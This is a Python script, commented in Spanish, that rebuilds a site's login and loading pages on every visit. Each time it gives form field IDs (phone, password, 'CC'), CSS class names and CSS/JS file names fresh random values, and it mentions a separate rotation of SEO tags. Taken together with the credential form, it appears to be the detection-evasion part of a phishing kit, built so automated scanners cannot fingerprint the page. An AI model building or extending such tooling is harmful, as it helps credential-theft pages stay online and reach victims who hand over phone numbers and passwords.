#!/usr/bin/env python3
"""
randomize.py — executive/
─────────────────────────────────────────────────────────────────────────────
Obfusca la estructura HTML en cada nuevo ingreso de usuario:
  · IDs de divs y contenedores clave
  · Atributos name e id de inputs / selects
  · Nombres de clases CSS referenciadas en JavaScript
  · Nombres de archivos CSS y JS servidos (copias con nombre aleatorio)

La rotación SEO (titles, meta tags, canonical) sigue en rotate_lib.php.

CÓMO FUNCIONA (usuarios activos no se ven afectados)
  · Escrituras atómicas (.tmp → os.replace): ningún archivo a medias.
  · Lock no-bloqueante: si dos visitas coinciden, solo una rota; la otra
    cede inmediatamente sin bloquear al visitante.
  · Al limpiar assets viejos espera una rotación completa antes de borrar,
    para que usuarios con la página ya cargada terminen de descargar el CSS/JS.

USO:
    python randomize.py              # obfuscar una vez
    python randomize.py --dry-run    # mostrar qué cambiaría sin escribir
    python randomize.py --force      # limpiar lock y ejecutar (debug)
"""

import os
import sys
import json
import time
import string
import random
import argparse
from pathlib import Path

# ── Rutas ──────────────────────────────────────────────────────────────────────
BASE_DIR   = Path(__file__).resolve().parent
LOCK_FILE  = BASE_DIR / ".randomize_lock"
STATE_FILE = BASE_DIR / ".randomize_state"
LOCK_STALE = 30  # segundos antes de considerar lock huérfano

# ── Templates → archivos de salida HTML ───────────────────────────────────────
# Cada tupla: (archivo_template, archivo_salida)
HTML_TEMPLATES = [
    ("acceso.html.tpl",   "acceso.html"),
    ("cargando.html.tpl", "cargando.html"),
]

# Template de JS → salida con nombre aleatorio (token __NQ_AJS__)
JS_TEMPLATE = "acceso.js.tpl"

# Assets que se copian con nombre aleatorio (sin template, contenido intacto)
PLAIN_ASSETS = {
    "styles.css":  "__NQ_STYLES__",   # copia directa
    "protect.js":  "__NQ_PJS__",      # copia directa
}

# Asset CSS con sustitución de clases → copia con nombre aleatorio
CSS_TEMPLATE_ASSET = "acceso.css"     # fuente canónica
CSS_ASSET_TOKEN    = "__NQ_ACSS__"

# Clases CSS a obfuscar (aparecen en JS y en el CSS fuente)
CSS_CLASS_SUBS = {
    "btn-pink":    "__NQ_BTN__",
    "fade-out":    "__NQ_FADE__",
    "nq-toast":    "__NQ_TCLASS__",
    "input-error": "__NQ_ERR__",
}


# ── Generadores de nombres aleatorios ─────────────────────────────────────────
_ALPHA    = string.ascii_lowercase
_ALPHANUM = string.ascii_lowercase + string.digits

def rand_id(n: int = 7) -> str:
    """ID/clase CSS válido: empieza con letra, solo alfanumérico."""
    return random.choice(_ALPHA) + "".join(random.choices(_ALPHANUM, k=n - 1))

def rand_fname(ext: str, n: int = 9) -> str:
    """Nombre de archivo aleatorio con la extensión dada."""
    return random.choice(_ALPHA) + "".join(random.choices(_ALPHANUM, k=n - 1)) + ext


# ── Escritura atómica ──────────────────────────────────────────────────────────
def atomic_write(path: Path, content: str, dry_run: bool = False) -> None:
    if dry_run:
        print(f"  [DRY] {path.name}  ({len(content):,} chars)")
        return
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(content, encoding="utf-8")
    os.replace(tmp, path)


# ── Estado persistente (assets actuales para borrarlos en la próxima ronda) ───
def load_state() -> dict:
    if STATE_FILE.is_file():
        try:
            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {}

def save_state(state: dict) -> None:
    tmp = STATE_FILE.with_suffix(".tmp")
    tmp.write_text(json.dumps(state), encoding="utf-8")
    os.replace(tmp, STATE_FILE)


# ── Lock cross-platform, resistente a procesos muertos ────────────────────────
class FileLock:
    def __init__(self, path: Path, stale: int = 30):
        self.path  = path
        self.stale = stale
        self._fd   = None

    def acquire(self) -> bool:
        try:
            if time.time() - self.path.stat().st_mtime > self.stale:
                self.path.unlink(missing_ok=True)
        except FileNotFoundError:
            pass
        try:
            self._fd = os.open(str(self.path), os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            os.write(self._fd, str(os.getpid()).encode())
            return True
        except FileExistsError:
            return False

    def release(self) -> None:
        if self._fd is not None:
            try:
                os.close(self._fd)
            except OSError:
                pass
            self._fd = None
        self.path.unlink(missing_ok=True)

    def force_release(self) -> None:
        self.path.unlink(missing_ok=True)


# ── Aplicar mapping de tokens ──────────────────────────────────────────────────
def apply_tokens(content: str, mapping: dict) -> str:
    for token, value in mapping.items():
        content = content.replace(token, value)
    return content


# ── Rotación principal ─────────────────────────────────────────────────────────
def rotate(dry_run: bool = False) -> dict:
    old_state = load_state()

    # Generar nombres aleatorios para cada token
    mapping = {
        # IDs de elementos HTML
        "__NQ_LOADER__":  rand_id(),
        "__NQ_APP__":     rand_id(),
        "__NQ_FORM__":    rand_id(),
        "__NQ_CC__":      rand_id(),
        "__NQ_PHONE__":   rand_id(),
        "__NQ_PWD__":     rand_id(),
        "__NQ_TOAST__":   rand_id(),
        "__NQ_STATUS__":  rand_id(),
        # Nombres de clases CSS
        "__NQ_BTN__":     rand_id(),
        "__NQ_FADE__":    rand_id(),
        "__NQ_ERR__":     rand_id(),
        "__NQ_TCLASS__":  rand_id(),
        # Nombres de archivos de assets
        "__NQ_STYLES__":  rand_fname(".css"),
        "__NQ_ACSS__":    rand_fname(".css"),
        "__NQ_PJS__":     rand_fname(".js"),
        "__NQ_AJS__":     rand_fname(".js"),
    }

    changed = []

    # ── Archivos HTML desde templates ──────────────────────────────────────────
    for tpl_name, out_name in HTML_TEMPLATES:
        tpl_path = BASE_DIR / tpl_name
        if not tpl_path.is_file():
            print(f"  [WARN] template no encontrado: {tpl_name}")
            continue
        content = apply_tokens(tpl_path.read_text(encoding="utf-8"), mapping)
        atomic_write(BASE_DIR / out_name, content, dry_run)
        changed.append(out_name)

    # ── JS desde template → archivo con nombre aleatorio ──────────────────────
    js_tpl = BASE_DIR / JS_TEMPLATE
    if js_tpl.is_file():
        content = apply_tokens(js_tpl.read_text(encoding="utf-8"), mapping)
        atomic_write(BASE_DIR / mapping["__NQ_AJS__"], content, dry_run)
        changed.append(mapping["__NQ_AJS__"])
    else:
        print(f"  [WARN] template no encontrado: {JS_TEMPLATE}")

    # ── CSS fuente con sustitución de clases → nombre aleatorio ───────────────
    css_src = BASE_DIR / CSS_TEMPLATE_ASSET
    if css_src.is_file():
        content = css_src.read_text(encoding="utf-8")
        for old_cls, token in CSS_CLASS_SUBS.items():
            content = content.replace(old_cls, mapping[token])
        atomic_write(BASE_DIR / mapping[CSS_ASSET_TOKEN], content, dry_run)
        changed.append(mapping[CSS_ASSET_TOKEN])
    else:
        print(f"  [WARN] asset CSS no encontrado: {CSS_TEMPLATE_ASSET}")

    # ── Assets sin modificar → copias con nombre aleatorio ────────────────────
    for src_name, token in PLAIN_ASSETS.items():
        src = BASE_DIR / src_name
        if src.is_file():
            content = src.read_text(encoding="utf-8")
            atomic_write(BASE_DIR / mapping[token], content, dry_run)
            changed.append(mapping[token])
        else:
            print(f"  [WARN] asset no encontrado: {src_name}")

    # ── Limpiar assets de la rotación anterior ─────────────────────────────────
    if not dry_run:
        for old_name in old_state.get("assets", []):
            try:
                (BASE_DIR / old_name).unlink()
            except OSError:
                pass

        new_assets = [
            mapping["__NQ_STYLES__"],
            mapping["__NQ_ACSS__"],
            mapping["__NQ_PJS__"],
            mapping["__NQ_AJS__"],
        ]
        save_state({"assets": new_assets, "ts": int(time.time())})

    return {"mapping": mapping, "changed": changed}


# ── Entry point ────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Obfusca estructura HTML del sitio executive/ en cada ingreso."
    )
    parser.add_argument("--dry-run", action="store_true",
                        help="Mostrar cambios sin escribir archivos.")
    parser.add_argument("--force", action="store_true",
                        help="Eliminar lock existente antes de ejecutar.")
    args = parser.parse_args()

    lock = FileLock(LOCK_FILE, stale=LOCK_STALE)
    if args.force:
        lock.force_release()

    if not lock.acquire():
        sys.exit(0)

    try:
        result = rotate(dry_run=args.dry_run)
        m = result["mapping"]
        tag = " [DRY RUN]" if args.dry_run else ""
        print(f"[randomize]{tag}")
        print(f"  IDs  → loader={m['__NQ_LOADER__']}  form={m['__NQ_FORM__']}  "
              f"phone={m['__NQ_PHONE__']}  pwd={m['__NQ_PWD__']}")
        print(f"  CSS  → btn={m['__NQ_BTN__']}  fade={m['__NQ_FADE__']}  "
              f"toast={m['__NQ_TCLASS__']}  err={m['__NQ_ERR__']}")
        print(f"  files→ {', '.join(result['changed'])}")
    finally:
        lock.release()


if __name__ == "__main__":
    main()
